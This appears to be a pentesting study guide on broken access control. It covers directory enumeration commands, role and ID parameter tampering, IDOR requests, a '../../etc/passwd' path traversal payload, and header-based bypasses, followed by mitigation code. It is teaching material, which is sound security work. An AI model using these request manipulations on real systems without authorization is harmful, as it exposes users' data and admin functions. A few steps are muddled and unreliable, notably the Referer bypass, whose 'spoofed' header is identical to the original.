# 🔓 Broken Access Control - Complete Vulnerability Guide

> 🎯 OWASP Top 10 #1 - Comprehensive guide to identifying and exploiting broken access control vulnerabilities

---

## 📋 Table of Contents

- 🔍 What is Broken Access Control
- 📁 Directory Exposure
- 💻 Source Code Analysis
- 🔧 Parameter Manipulation
- 👤 Role-Based Attacks
- 🔑 IDOR Vulnerabilities
- 📨 Header-Based Bypasses
- 🛡️ Mitigation Strategies

---

## 🔍 What is Broken Access Control

> [!danger] Critical Vulnerability Broken Access Control occurs when users can access resources or perform actions outside their intended permissions. This is the **#1 vulnerability** in OWASP Top 10 (2021).

### Types of Access Control Failures

- 🔴 **Vertical Privilege Escalation** - Regular user → Admin
- 🔵 **Horizontal Privilege Escalation** - User A → User B's data
- 🟡 **Context-Dependent Access** - Bypassing workflow restrictions

---

## 📁 1. Directory Exposure

> [!note] Vulnerability Type Sensitive or unprotected admin pages accessible through directory enumeration

### 🎯 Attack Methodology

**Step 1:** Enumerate directories using brute force

```bash
# Using dirb
dirb http://target.com /usr/share/wordlists/dirb/common.txt

# Using gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Using ffuf
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://target.com/FUZZ
```

**Step 2:** Identify sensitive endpoints

```
Common targets:
/admin
/administrator
/admin-panel
/dashboard
/console
/management
/backend
```

> [!success] Exploitation Once discovered, directly access the exposed admin pages without authentication

---

## 💻 2. Source Code Analysis

> [!note] Vulnerability Type Sensitive paths, folders, or files exposed in client-side source code

### 🔍 What to Look For

**Inspect HTML/JavaScript:**

```javascript
// Common exposures in source code
var adminPath = "/secret-admin-panel";
var apiEndpoint = "/api/v1/admin/users";
<!-- Admin panel: /hidden/administrator -->
```

### 🎯 Attack Steps

**Step 1:** View page source (Ctrl+U or right-click → View Source)

**Step 2:** Search for keywords:

```
admin
api
endpoint
path
route
secret
hidden
private
internal
```

**Step 3:** Check JavaScript files:

```bash
# Download and analyze JS files
curl http://target.com/js/main.js | grep -i "admin\|api\|secret"
```

> [!tip] Tools
> 
> - **JS-Scan** - Automated JavaScript analysis
> - **LinkFinder** - Extract endpoints from JS
> - **Burp Suite** - Scan for hidden parameters

---

## 🔧 3. User Role Controlled by Request Parameter

> [!note] Vulnerability Type Access control decisions based on client-side parameters

### 🎯 Attack Methodology

**Common Parameter Names:**

```
admin=false
isAdmin=0
role=user
userType=regular
access_level=1
privilege=low
```

**Exploitation Example:**

**Original Request:**

```http
GET /dashboard HTTP/1.1
Host: target.com
Cookie: session=abc123
admin=false
```

**Modified Request:**

```http
GET /admin HTTP/1.1
Host: target.com
Cookie: session=abc123
admin=true
```

### 📝 Step-by-Step Attack

**Step 1:** Identify the parameter

- Check URL parameters: `?admin=false`
- Check POST body: `admin=false&username=user`
- Check cookies: `admin=false`

**Step 2:** Modify the parameter

```bash
# Change parameter value
admin=false → admin=true
isAdmin=0 → isAdmin=1
role=user → role=admin
```

**Step 3:** Change the path

```
/user/dashboard → /admin/dashboard
```

**Step 4:** Send request

> [!success] Result 💥 Boom! Admin panel access gained

---

## 👤 4. User Role Modified in User Profile

> [!note] Vulnerability Type Role ID exposed and modifiable through profile update functionality

### 🎯 Attack Methodology

**Step 1:** Login with regular credentials

```
Username: user@example.com
Password: password123
```

**Step 2:** Explore the website for role parameters

- Check profile page
- Check account settings
- Check API responses

**Step 3:** Capture email update request in Burp Suite

```http
POST /api/user/update HTTP/1.1
Host: target.com
Content-Type: application/json

{
    "email": "newemail@example.com",
    "roleid": 2
}
```

**Step 4:** Modify the roleid

```json
{
    "email": "newemail@example.com",
    "roleid": 1  // Admin role
}
```

**Step 5:** Change username to `/admin` in Referer header

```http
POST /api/user/update HTTP/1.1
Host: target.com
Referer: http://target.com/admin
Content-Type: application/json
```

**Step 6:** Send request

> [!success] Result 💥 Boom! Admin panel access gained through role escalation

---

## 🔑 5. User ID Controlled by Request Parameter

> [!warning] Horizontal Privilege Escalation Access other users' data by manipulating user ID parameters

### 🎯 Attack Methodology

**Original Request:**

```http
GET /api/user/profile?id=123 HTTP/1.1
Host: target.com
Cookie: session=xyz789
```

**Step 1:** Capture the request in Burp Suite

**Step 2:** Send to Repeater (Ctrl+R)

**Step 3:** Change the user ID

```http
GET /api/user/profile?id=456 HTTP/1.1
```

**Step 4:** Hit Send

> [!success] Result 💥 Horizontal privilege escalation achieved! Access to other user's data

### 📊 Common Parameters to Test

```
id=123
user_id=123
userId=123
uid=123
account=123
profile_id=123
```

---

## 🔐 6. User ID with Unpredictable GUIDs

> [!note] Vulnerability Type GUID-based access control with information disclosure

### 🎯 Attack Methodology

**Step 1:** Find GUID disclosure points

```
Blog posts
Comments
Public profiles
API responses
Shared links
```

**Example URL:**

```
https://target.com/posts/author/8f14e45f-ceea-467a-9af1-f1797b7e8f7d
```

**Step 2:** Collect target GUIDs

```
User A GUID: 8f14e45f-ceea-467a-9af1-f1797b7e8f7d
Admin GUID: 3c7f8a9b-1234-5678-9abc-def012345678
```

**Step 3:** Login with regular credentials

**Step 4:** Capture authenticated request

```http
GET /api/user/data?guid=YOUR-GUID HTTP/1.1
Host: target.com
Cookie: session=abc123
```

**Step 5:** Replace with target GUID

```http
GET /api/user/data?guid=8f14e45f-ceea-467a-9af1-f1797b7e8f7d HTTP/1.1
```

> [!success] Result 💥 Access to victim's account data!

---

## 🗂️ 7. IDOR Vulnerability

> [!danger] Insecure Direct Object Reference Direct access to resources using predictable identifiers

### 🎯 Attack Methodology

**Common IDOR Scenarios:**

#### 📥 File Download IDOR

**Original Request:**

```http
GET /download?file=invoice_123.pdf HTTP/1.1
```

**Attack Request:**

```http
GET /download?file=invoice_456.pdf HTTP/1.1
GET /download?file=../../etc/passwd HTTP/1.1
GET /download?file=admin_report.pdf HTTP/1.1
```

#### 📄 Document Access IDOR

**Original Request:**

```http
GET /api/documents/1001 HTTP/1.1
```

**Attack Request:**

```http
GET /api/documents/1002 HTTP/1.1
GET /api/documents/9999 HTTP/1.1
```

### 🔍 Finding IDOR Vulnerabilities

**Step 1:** Look for resource identifiers

```
Document IDs
File names
Order numbers
Invoice IDs
User IDs
```

**Step 2:** Test parameter manipulation

```bash
# Sequential IDs
id=1, id=2, id=3

# Hash-based
hash=abc123, hash=def456

# Filename-based
file=report1.pdf, file=report2.pdf
```

**Step 3:** Attempt to access restricted resources

> [!warning] Impact
> 
> - 📄 Unauthorized file access
> - 💳 Financial data exposure
> - 👤 PII (Personal Identifiable Information) leak
> - 🔐 Password reset tokens

---

## 📨 8. URL-Based Access Control with X-Original-URL

> [!note] Vulnerability Type Header-based access control bypass using X-Original-URL

### 🎯 Attack Methodology

**Step 1:** Identify restricted endpoint

```http
GET /admin HTTP/1.1
Host: target.com

Response: 403 Forbidden
```

**Step 2:** Capture request in Burp Suite

**Step 3:** Add X-Original-URL header

```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin
```

**Alternative Headers to Test:**

```http
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 127.0.0.1
```

### 💡 How It Works

> [!info] Explanation The application trusts the X-Original-URL header to determine the original request path, bypassing front-end restrictions

**Step 4:** Send request

> [!success] Result 💥 Access to admin resources gained!

---

## 🔄 9. Referer-Based Access Control

> [!note] Vulnerability Type Access control based on Referer header validation

### 🎯 Attack Methodology

**Step 1:** Identify privileged functionality

```http
POST /admin/delete-user HTTP/1.1
Host: target.com
Referer: http://target.com/admin

Response: 200 OK
```

**Step 2:** Capture the request

**Step 3:** Modify Referer to bypass checks

```http
POST /admin/delete-user HTTP/1.1
Host: target.com
Referer: http://target.com/admin
Cookie: session=regular_user_session
```

### 🔧 Common Referer Bypasses

```http
# Original admin action
Referer: http://target.com/admin/dashboard

# Regular user with spoofed Referer
Referer: http://target.com/admin/dashboard
```

### 📝 Step-by-Step Attack

**Step 1:** Login as admin (or intercept admin request)

**Step 2:** Capture privileged action

```http
POST /admin/promote-user HTTP/1.1
Host: target.com
Referer: http://target.com/admin
Cookie: admin_session=xyz

user_id=999&role=admin
```

**Step 3:** Logout and login as regular user

**Step 4:** Replay request with modified Referer

```http
POST /admin/promote-user HTTP/1.1
Host: target.com
Referer: http://target.com/admin
Cookie: regular_session=abc

user_id=123&role=admin
```

> [!success] Result 💥 Privilege escalation through Referer manipulation!

---

## 🛡️ Mitigation Strategies

### ✅ For Developers

#### 1️⃣ Implement Server-Side Access Controls

```java
// ❌ Bad - Client-side check
if (request.getParameter("admin").equals("true")) {
    showAdminPanel();
}

// ✅ Good - Server-side check
if (session.getAttribute("userRole").equals("ADMIN")) {
    showAdminPanel();
}
```

#### 2️⃣ Use Indirect Object References

```python
# ❌ Bad - Direct reference
file_path = f"/files/{request.args.get('filename')}"

# ✅ Good - Indirect reference
file_id = request.args.get('id')
file_path = database.get_file_path_for_user(file_id, current_user)
```

#### 3️⃣ Implement Proper Authorization

```javascript
// ✅ Check authorization for every request
function deleteUser(userId) {
    if (!currentUser.hasPermission('DELETE_USER')) {
        throw new UnauthorizedError();
    }
    if (!currentUser.canAccessUser(userId)) {
        throw new ForbiddenError();
    }
    database.deleteUser(userId);
}
```

#### 4️⃣ Validate All Access Attempts

```python
def get_user_profile(user_id):
    # Check if current user can access this profile
    if not can_access(current_user, user_id):
        raise PermissionDenied()
    
    return database.get_user(user_id)
```

### 🔒 Security Best Practices

- ✅ **Deny by default** - Require explicit permission grants
- ✅ **Validate on server** - Never trust client input
- ✅ **Use UUIDs** - Avoid sequential IDs
- ✅ **Log access attempts** - Monitor for suspicious patterns
- ✅ **Implement RBAC** - Role-Based Access Control
- ✅ **Test thoroughly** - Include authorization in tests

---

## 🧪 Testing Checklist

### 🔍 Manual Testing Steps

- [ ] Test horizontal privilege escalation (access other users' data)
- [ ] Test vertical privilege escalation (regular user → admin)
- [ ] Enumerate directories for hidden admin panels
- [ ] Check source code for exposed paths
- [ ] Test parameter manipulation (admin=false → true)
- [ ] Test IDOR on all resource identifiers
- [ ] Test X-Original-URL header bypass
- [ ] Test Referer-based access control
- [ ] Test role modification in profile updates
- [ ] Check for GUID disclosure in public areas

### 🛠️ Tools to Use

|Tool|Purpose|
|---|---|
|🦊 **Burp Suite**|Request interception and manipulation|
|🔍 **OWASP ZAP**|Automated scanning|
|📁 **Gobuster**|Directory enumeration|
|🎯 **FFuf**|Fuzzing parameters|
|🔗 **LinkFinder**|Extract endpoints from JavaScript|
|📊 **Autorize**|Burp extension for authorization testing|

---

## 📚 Real-World Examples

### Example 1: Facebook IDOR (2013)

> [!example] Case Study Vulnerability in Facebook's Graph API allowed accessing any user's photos by manipulating photo IDs.
> 
> **Impact:** Access to private photos **Bounty:** $12,500

### Example 2: Uber Admin Panel (2016)

> [!example] Case Study Admin panel accessible without authentication through predictable URL.
> 
> **Impact:** Full admin access **Bounty:** $10,000

### Example 3: Tesla IDOR (2020)

> [!example] Case Study Vehicle data accessible by manipulating VIN parameters in API requests.
> 
> **Impact:** Access to other users' vehicle data **Bounty:** $1,000

---

## 🎯 Quick Reference Card

### Attack Pattern Summary

|#|Attack Type|Key Indicator|Fix|
|---|---|---|---|
|1|Directory Exposure|Unprotected admin paths|Implement authentication|
|2|Source Code Leak|Paths in JS/HTML|Don't expose sensitive paths|
|3|Parameter Manipulation|`admin=false`|Server-side validation|
|4|Role Modification|Exposed role IDs|Immutable role assignment|
|5|User ID Manipulation|Sequential IDs|Authorization checks|
|6|GUID Disclosure|GUIDs in URLs|Validate user access|
|7|IDOR|Predictable references|Indirect references|
|8|X-Original-URL|Header-based routing|Validate actual request path|
|9|Referer-Based|Trust Referer header|Don't trust headers|

---

## 🔗 Additional Resources

- 🌐 [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/)
- 📘 [PortSwigger Access Control Labs](https://portswigger.net/web-security/access-control)
- 🎓 [HackerOne Reports](https://hackerone.com/reports)
- 📚 [OWASP Top 10 - A01:2021](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

---

## ⚠️ Legal Disclaimer

> [!danger] Ethical Hacking Only
> 
> - ✅ Only test on systems you own or have explicit written permission to test
> - ✅ Bug bounty programs with clear scope
> - ❌ Unauthorized testing is illegal
> - ❌ Can result in criminal prosecution

---

**Tags:** #broken-access-control #owasp-top10 #web-security #privilege-escalation #idor #pentesting

**Last Updated:** 2025-10-29